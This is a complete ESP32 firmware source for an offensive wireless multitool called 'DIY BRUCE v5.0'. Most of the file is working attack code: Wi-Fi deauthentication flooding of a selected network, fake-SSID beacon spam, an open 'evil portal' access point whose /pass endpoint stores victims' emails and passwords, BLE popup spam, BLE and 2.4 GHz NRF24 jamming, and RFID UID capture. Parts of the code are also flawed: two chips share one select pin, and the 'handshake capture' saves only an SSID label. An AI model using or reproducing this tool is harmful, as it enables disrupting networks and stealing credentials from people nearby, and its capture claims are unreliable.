// DIY BRUCE v5.0 - WORKING VERSION FOR ESP32 DevKit V1
#include <Arduino.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <EEPROM.h>
#include <esp_wifi.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertising.h>
#include <SPI.h>
#include <RF24.h>
#include <MFRC522.h>

// PINS
#define BTN_UP     15
#define BTN_DOWN   13
#define BTN_OK     12
#define BTN_LEFT   14
#define BTN_RIGHT  27
#define BTN_BACK   26
#define RFID_SS    5
#define RFID_RST   33
#define IR_LED     2
#define NRF_CE     4
#define NRF_CS     5

// OBJECTS
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 21, 22);
WebServer server(80);
DNSServer dnsServer;
RF24 radio(NRF_CE, NRF_CS);
MFRC522 rfid(RFID_SS, RFID_RST);

// GLOBALS
bool deauthActive=false, beaconActive=false, evilActive=false, wifiJamActive=false;
bool handshakeCapturing=false, bleJamActive=false, nrfJamActive=false, webRunning=false;
unsigned long deauthPackets=0, beaconPackets=0, eapolCount=0;
int networkCount=0, lastRSSI=-50;
String networkNames[50], capturedPasswords="", handshakes="";
uint8_t networkBSSID[50][6], networkChannel[50], targetBSSID[6];
String currentTargetSSID="";
uint8_t nrfCh=76;
bool nrfOK=false;
unsigned long lastBtnTime=0;

bool btn(int p){
    if(digitalRead(p)==LOW && millis()-lastBtnTime>200){
        lastBtnTime=millis();
        return true;
    }
    return false;
}

void drawTopBar(){
    u8g2.setFont(u8g2_font_6x13_tr);
    u8g2.drawStr(2,9,String(millis()/1000).c_str());
    u8g2.setCursor(100,9);
    u8g2.print(String(lastRSSI)+"dB");
    u8g2.drawLine(0,10,128,10);
}

void showMsg(const char* msg,int d){
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(10,35,msg);
    u8g2.sendBuffer();
    delay(d);
}

void saveData(){
    EEPROM.begin(4096);
    String d="===PASS===\n"+capturedPasswords+"\n===HAND===\n"+handshakes+"\n";
    for(int i=0;i<d.length()&&i<4095;i++) EEPROM.write(i,d[i]);
    EEPROM.write(d.length(),0);
    EEPROM.commit();
    EEPROM.end();
}

void loadData(){
    EEPROM.begin(4096);
    String l="";
    for(int i=0;i<4096;i++){
        char c=EEPROM.read(i);
        if(c==0) break;
        l+=c;
    }
    int ps=l.indexOf("===PASS===\n");
    int hs=l.indexOf("===HAND===\n");
    if(ps!=-1 && hs!=-1){
        capturedPasswords=l.substring(ps+11,hs-1);
        handshakes=l.substring(hs+11);
    }
    EEPROM.end();
}

void clearData(){
    capturedPasswords="";
    handshakes="";
    saveData();
    showMsg("Data cleared",1000);
}

void rebootDevice(){
    showMsg("Rebooting...",1000);
    ESP.restart();
}

void scanWiFi(){
    showMsg("Scanning WiFi...",500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    networkCount=WiFi.scanNetworks();
    if(networkCount>50) networkCount=50;
    for(int i=0;i<networkCount;i++){
        networkNames[i]=WiFi.SSID(i);
        if(networkNames[i].length()==0) networkNames[i]="<Hidden>";
        networkChannel[i]=WiFi.channel(i);
        memcpy(networkBSSID[i],WiFi.BSSID(i),6);
    }
    char buf[32];
    sprintf(buf,"Found: %d",networkCount);
    showMsg(buf,1500);
    WiFi.mode(WIFI_AP_STA);
}

void sendDeauthPacket(uint8_t* bssid,uint8_t* client,int ch){
    esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
    uint8_t packet[26]={
        0xC0,0x00,0x00,0x00,
        client[0],client[1],client[2],client[3],client[4],client[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        0x00,0x00,0x07,0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA,packet,26,false);
    deauthPackets++;
}

void startWiFiDeauth(){
    if(networkCount==0){
        showMsg("SCAN first!",1000);
        return;
    }
    int target=0;
    while(true){
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5,15,"Select target:");
        for(int i=0;i<min(networkCount,5);i++){
            if(i==target) u8g2.drawStr(5,30+i*8,">");
            u8g2.drawStr(20,30+i*8,networkNames[i].substring(0,14).c_str());
        }
        u8g2.drawStr(5,60,"UP/DN=select OK=start BACK");
        u8g2.sendBuffer();
        if(btn(BTN_UP) && target>0) target--;
        else if(btn(BTN_DOWN) && target<min(networkCount,5)-1) target++;
        else if(btn(BTN_OK)) break;
        else if(btn(BTN_BACK)) return;
        delay(50);
    }
    deauthActive=true;
    deauthPackets=0;
    int ch=networkChannel[target];
    uint8_t* bssid=networkBSSID[target];
    uint8_t broadcast[]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    showMsg("DEAUTH started",1000);
    while(deauthActive){
        sendDeauthPacket(bssid,broadcast,ch);
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20,25,"DEAUTH ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf,"Packets: %lu",deauthPackets);
        u8g2.drawStr(5,45,buf);
        u8g2.drawStr(5,60,"BACK - Stop");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) deauthActive=false;
        delay(50);
    }
    showMsg("DEAUTH stopped",1000);
}

void stopWiFiDeauth(){ deauthActive=false; }

void startWiFiBeacon(){
    beaconActive=true;
    beaconPackets=0;
    const char* ssids[]={"FREE_WIFI","Starbucks","Airport","Metro_Free","PublicWiFi"};
    showMsg("BEACON started",1000);
    while(beaconActive){
        for(int s=0;s<5 && beaconActive;s++){
            uint8_t bssid[6];
            for(int i=0;i<6;i++) bssid[i]=random(256);
            bssid[0]|=0x02;
            uint8_t packet[200];
            int len=0;
            packet[len++]=0x80; packet[len++]=0x00;
            packet[len++]=0x00; packet[len++]=0x00;
            for(int i=0;i<6;i++) packet[len++]=0xFF;
            for(int i=0;i<6;i++) packet[len++]=bssid[i];
            for(int i=0;i<6;i++) packet[len++]=bssid[i];
            packet[len++]=0x00; packet[len++]=0x00;
            for(int i=0;i<8;i++) packet[len++]=0x00;
            packet[len++]=0x64; packet[len++]=0x00;
            packet[len++]=0x11; packet[len++]=0x00;
            packet[len++]=0x00; packet[len++]=strlen(ssids[s]);
            for(int i=0;i<(int)strlen(ssids[s]);i++) packet[len++]=ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA,packet,len,false);
            beaconPackets++;
        }
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20,25,"BEACON ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf,"Sent: %lu",beaconPackets);
        u8g2.drawStr(5,45,buf);
        u8g2.drawStr(5,60,"BACK - Stop");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) beaconActive=false;
        delay(30);
    }
}

void stopWiFiBeacon(){ beaconActive=false; }

void handshakeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type){
    if(!handshakeCapturing) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t *payload = pkt->payload;
    if(len < 30) return;
    for(int i=0;i<len-8;i++){
        if(payload[i]==0x88 && payload[i+1]==0x8E){
            eapolCount++;
            handshakes += "[HANDSHAKE] " + currentTargetSSID + "\n";
            saveData();
            showMsg("HANDSHAKE CAPTURED!",2000);
            handshakeCapturing=false;
            return;
        }
    }
}

void startHandshakeSniffer(){
    if(networkCount==0){
        showMsg("SCAN first!",1000);
        return;
    }
    int target=0;
    while(true){
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5,15,"Select network:");
        for(int i=0;i<min(networkCount,5);i++){
            if(i==target) u8g2.drawStr(5,30+i*8,">");
            u8g2.drawStr(20,30+i*8,networkNames[i].substring(0,14).c_str());
        }
        u8g2.drawStr(5,60,"OK - Capture BACK");
        u8g2.sendBuffer();
        if(btn(BTN_UP) && target>0) target--;
        else if(btn(BTN_DOWN) && target<min(networkCount,5)-1) target++;
        else if(btn(BTN_OK)) break;
        else if(btn(BTN_BACK)) return;
        delay(50);
    }
    currentTargetSSID = networkNames[target];
    memcpy(targetBSSID, networkBSSID[target], 6);
    esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
    eapolCount=0;
    handshakeCapturing=true;
    showMsg("Capturing handshake... 30s",1500);
    unsigned long start=millis();
    while(handshakeCapturing && millis()-start<30000){
        sendDeauthPacket(targetBSSID,(uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},networkChannel[target]);
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf,"EAPOL: %d",eapolCount);
        u8g2.drawStr(5,30,buf);
        sprintf(buf,"Time: %d/30s",(millis()-start)/1000);
        u8g2.drawStr(5,45,buf);
        u8g2.drawStr(5,60,"BACK - Exit");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) handshakeCapturing=false;
        delay(100);
    }
    handshakeCapturing=false;
    if(eapolCount>0) showMsg("HANDSHAKE saved!",1500);
    else showMsg("Failed to capture",1500);
}

void startEvilTwin(){
    if(evilActive) return;
    WiFi.softAP("FREE_WIFI",NULL);
    dnsServer.start(53,"*",WiFi.softAPIP());
    evilActive=true;
    showMsg("EVIL PORTAL: FREE_WIFI",1500);
    while(evilActive){
        dnsServer.processNextRequest();
        server.handleClient();
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20,25,"EVIL PORTAL");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5,45,"SSID: FREE_WIFI");
        u8g2.drawStr(5,60,"BACK - Stop");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) evilActive=false;
        delay(100);
    }
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    showMsg("EVIL PORTAL stopped",1000);
}

void stopEvilTwin(){ evilActive=false; }

void scanBLE(){
    showMsg("Scanning BLE...",500);
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    BLEScanResults* results = pBLEScan->start(5, false);
    int count = results->getCount();
    char buf[32];
    sprintf(buf,"Found: %d",count);
    showMsg(buf,1500);
    pBLEScan->clearResults();
    BLEDevice::deinit();
}

void sendBLEAdvertisement(const char* name, const uint8_t* manufData, int manufLen){
    BLEDevice::init("ESP_SPAM");
    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    advData.setFlags(0x06);
    if(name && strlen(name)>0) advData.setName(name);
    if(manufData && manufLen>0) advData.setManufacturerData(manufData, manufLen);
    pAdv->setAdvertisementData(advData);
    pAdv->start();
    delay(50);
    pAdv->stop();
    BLEDevice::deinit();
}

void startBLEAppleJuice(){
    showMsg("APPLEJUICE SPAM",1000);
    const uint8_t appleData[]={0x4C,0x00,0x0F,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    for(int i=0;i<30;i++){
        sendBLEAdvertisement(nullptr,appleData,sizeof(appleData));
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("APPLEJUICE done",1000);
}

void startBLESamsung(){
    showMsg("SAMSUNG SPAM",1000);
    for(int i=0;i<30;i++){
        String name = "Samsung_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(),nullptr,0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("SAMSUNG done",1000);
}

void startBLEAndroid(){
    showMsg("ANDROID SPAM",1000);
    for(int i=0;i<30;i++){
        String name = "Android_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(),nullptr,0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("ANDROID done",1000);
}

void startBLEWindows(){
    showMsg("WINDOWS SPAM",1000);
    for(int i=0;i<30;i++){
        String name = "Windows_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(),nullptr,0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("WINDOWS done",1000);
}

void startBLEJammer(){
    bleJamActive=true;
    showMsg("BLE JAMMER started",1000);
    while(bleJamActive){
        String randomName = "JAM_" + String(random(99999));
        BLEDevice::init(randomName.c_str());
        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setName(randomName);
        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(20);
        pAdv->stop();
        BLEDevice::deinit();
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15,30,"BLE JAMMER");
        u8g2.drawStr(5,60,"BACK - Stop");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) bleJamActive=false;
        delay(10);
    }
    showMsg("BLE JAMMER stopped",1000);
}

void stopBLEJammer(){ bleJamActive=false; }

void initNRF(){
    if(!radio.begin()){
        nrfOK=false;
        showMsg("NRF24 not found!",1500);
        return;
    }
    radio.setChannel(nrfCh);
    radio.setPALevel(RF24_PA_LOW);
    radio.setDataRate(RF24_1MBPS);
    radio.setAutoAck(false);
    nrfOK=true;
    showMsg("NRF24 ready",1000);
}

void scanNRF(){
    if(!nrfOK){
        showMsg("NRF24 not connected!",1000);
        return;
    }
    int active=0;
    showMsg("Scanning NRF channels...",500);
    for(int ch=0;ch<=125;ch++){
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(200);
        if(radio.testCarrier()) active++;
        radio.stopListening();
    }
    radio.setChannel(nrfCh);
    char buf[32];
    sprintf(buf,"Active: %d",active);
    showMsg(buf,1500);
}

void startNRFJammer(){
    if(!nrfOK){
        showMsg("NRF24 not connected!",1000);
        return;
    }
    nrfJamActive=true;
    radio.stopListening();
    showMsg("NRF JAMMER started",1000);
    while(nrfJamActive){
        for(int ch=0;ch<=125 && nrfJamActive;ch++){
            radio.setChannel(ch);
            uint8_t junk[32];
            for(int i=0;i<32;i++) junk[i]=random(256);
            radio.write(&junk,32);
        }
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15,30,"NRF JAMMER");
        u8g2.drawStr(5,60,"BACK - Stop");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) nrfJamActive=false;
        delay(5);
    }
    radio.setChannel(nrfCh);
    showMsg("NRF JAMMER stopped",1000);
}

void stopNRFJammer(){ nrfJamActive=false; }

void initRFID(){
    SPI.begin(18,19,23,5);
    rfid.PCD_Init();
    showMsg("RFID ready",1000);
}

void readRFID(){
    showMsg("Place card...",1000);
    if(!rfid.PICC_IsNewCardPresent()){
        showMsg("No card",1000);
        return;
    }
    if(!rfid.PICC_ReadCardSerial()){
        showMsg("Read error",1000);
        return;
    }
    String uid="";
    for(byte i=0;i<rfid.uid.size;i++){
        uid+=String(rfid.uid.uidByte[i],HEX);
        if(i<rfid.uid.size-1) uid+=":";
    }
    capturedPasswords += "[RFID] " + uid + "\n";
    saveData();
    char buf[64];
    sprintf(buf,"UID: %s",uid.c_str());
    showMsg(buf,2000);
    rfid.PICC_HaltA();
}

#include <IRsend.h>
IRsend irsend(IR_LED);

void initIR(){
    irsend.begin();
    showMsg("IR ready",1000);
}

void sendIRPower(){
    irsend.sendNEC(0x00FF00FF,32);
    showMsg("IR POWER",500);
}

void sendIRVolumeUp(){
    irsend.sendNEC(0x00FF40BF,32);
    showMsg("IR VOL+",500);
}

void sendIRVolumeDown(){
    irsend.sendNEC(0x00FFC03F,32);
    showMsg("IR VOL-",500);
}

const char index_html[] PROGMEM = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>DIY BRUCE</title><style>body{background:#0a0a1a;color:#eee;font-family:monospace;padding:20px;}button{background:#ff6b35;border:none;padding:10px;margin:5px;border-radius:10px;color:white;cursor:pointer;}.btn-group{display:flex;flex-wrap:wrap;gap:10px;}pre{background:#1a1a2e;padding:10px;border-radius:10px;}</style></head><body><h1>DIY BRUCE v5.0</h1><div class='btn-group'><button onclick=\"fetch('/cmd?c=scan')\">SCAN WiFi</button><button onclick=\"fetch('/cmd?c=deauth_start')\">DEAUTH</button><button onclick=\"fetch('/cmd?c=beacon_start')\">BEACON</button><button onclick=\"fetch('/cmd?c=evil_start')\">EVIL</button><button onclick=\"fetch('/cmd?c=handshake')\">HANDSHAKE</button><button onclick=\"fetch('/cmd?c=ble_apple')\">APPLE</button><button onclick=\"fetch('/cmd?c=ble_samsung')\">SAMSUNG</button><button onclick=\"fetch('/cmd?c=rfid_read')\">RFID READ</button><button onclick=\"fetch('/cmd?c=view_pass')\">VIEW PASS</button><button onclick=\"fetch('/cmd?c=clear_pass')\">CLEAR</button><button onclick=\"fetch('/cmd?c=reboot')\">REBOOT</button></div><h2>Passwords:</h2><pre id='pass'></pre><h2>Status:</h2><pre id='status'></pre><script>function update(){fetch('/data').then(r=>r.json()).then(d=>document.getElementById('status').innerText='DEAUTH:'+d.deauth+' BEACON:'+d.beacon+' RSSI:'+d.rssi);fetch('/cmd?c=view_pass').then(r=>r.text()).then(t=>document.getElementById('pass').innerText=t||'(empty)');}setInterval(update,2000);update();</script></body></html>";

void handleRoot(){ server.send(200,"text/html",index_html); }
void handleData(){
    String j="{\"deauth\":"+String(deauthPackets)+",\"beacon\":"+String(beaconPackets)+",\"rssi\":"+String(lastRSSI)+",\"uptime\":"+String(millis()/1000)+"}";
    server.send(200,"application/json",j);
}
void handleCmd(){
    if(!server.hasArg("c")){ server.send(200,"text/plain","NO CMD"); return; }
    String cmd=server.arg("c");
    if(cmd=="scan") scanWiFi();
    else if(cmd=="deauth_start") startWiFiDeauth();
    else if(cmd=="deauth_stop") stopWiFiDeauth();
    else if(cmd=="beacon_start") startWiFiBeacon();
    else if(cmd=="beacon_stop") stopWiFiBeacon();
    else if(cmd=="evil_start") startEvilTwin();
    else if(cmd=="evil_stop") stopEvilTwin();
    else if(cmd=="handshake") startHandshakeSniffer();
    else if(cmd=="ble_apple") startBLEAppleJuice();
    else if(cmd=="ble_samsung") startBLESamsung();
    else if(cmd=="ble_android") startBLEAndroid();
    else if(cmd=="ble_windows") startBLEWindows();
    else if(cmd=="ble_jam") startBLEJammer();
    else if(cmd=="nrf_scan") scanNRF();
    else if(cmd=="nrf_jam") startNRFJammer();
    else if(cmd=="nrf_stop") stopNRFJammer();
    else if(cmd=="rfid_read") readRFID();
    else if(cmd=="ir_power") sendIRPower();
    else if(cmd=="view_pass") server.send(200,"text/plain",capturedPasswords.length()?capturedPasswords:"(empty)");
    else if(cmd=="clear_pass") clearData();
    else if(cmd=="reboot") rebootDevice();
    else server.send(200,"text/plain","OK");
    server.send(200,"text/plain","OK");
}

void startWebServer(){
    if(webRunning) return;
    WiFi.softAP("DIY_BRUCE","bruce1234");
    server.on("/",handleRoot);
    server.on("/cmd",handleCmd);
    server.on("/data",handleData);
    server.on("/pass",HTTP_POST,[](){
        if(server.hasArg("email")||server.hasArg("password")){
            capturedPasswords+="[PASS] "+server.arg("email")+" | "+server.arg("password")+"\n";
            saveData();
        }
        server.send(200,"text/html","<html><body><h3>OK</h3></body></html>");
    });
    server.begin();
    webRunning=true;
    showMsg("WEB: 192.168.4.1",2000);
}

void stopWebServer(){
    if(!webRunning) return;
    server.stop();
    WiFi.softAPdisconnect(true);
    webRunning=false;
    showMsg("WEB stopped",1000);
}

void setup(){
    Serial.begin(115200);
    pinMode(BTN_UP,INPUT_PULLUP);pinMode(BTN_DOWN,INPUT_PULLUP);pinMode(BTN_OK,INPUT_PULLUP);
    pinMode(BTN_LEFT,INPUT_PULLUP);pinMode(BTN_RIGHT,INPUT_PULLUP);pinMode(BTN_BACK,INPUT_PULLUP);
    Wire.begin(21,22);
    u8g2.begin();
    u8g2.setContrast(200);
    SPI.begin(18,19,23,5);
    initRFID();
    initIR();
    initNRF();
    loadData();
    for(int x=128;x>=0;x-=8){
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_logisoso24_tr);
        u8g2.drawStr(x+4,32,"DIY");
        u8g2.setFont(u8g2_font_7x13B_tr);
        u8g2.drawStr(x+4,48,"BRUCE");
        u8g2.sendBuffer();
        delay(10);
    }
    delay(500);
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeSnifferCallback);
    startWebServer();
    showMsg("DIY BRUCE v5.0 READY",1500);
}

void loop(){
    server.handleClient();
    delay(20);
}
